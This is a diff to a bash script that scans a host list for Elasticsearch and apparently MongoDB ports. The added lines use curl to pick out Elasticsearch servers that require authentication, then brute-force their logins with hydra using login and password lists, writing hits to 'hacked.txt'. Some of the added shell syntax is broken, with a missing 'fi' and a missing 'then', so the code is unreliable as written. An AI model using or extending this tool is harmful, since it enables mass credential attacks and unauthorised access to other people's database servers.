@@ -15,6 +15,7 @@ fi
 
 if [[ "$1" == "9200" ]]; then
 echo "" > elastic.txt
+echo "" > elastic_secured.txt
 fi
 
 if [[ "$1" == "27017" ]]; then
@@ -41,6 +42,9 @@ do
 		then echo $line >> elastic.txt; 
 		nmap $line -p$1 --script=elastic | grep "|">> elastic.txt
 	fi
+	
+	if curl -X GET "$line:9200/" | grep "security_exception";
+		then echo $line >> elastic_secured.txt;
 done
 fi
 
@@ -59,6 +63,15 @@ done
 fi
 
 
+#brute secured elastics
+
+if [ -s elastic_secured.txt ]
+
+	/usr/bin/hydra -M ./elastic_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 9200 -o ./hacked.txt http-get /
+
+else
+	exit
+fi
 
 
 
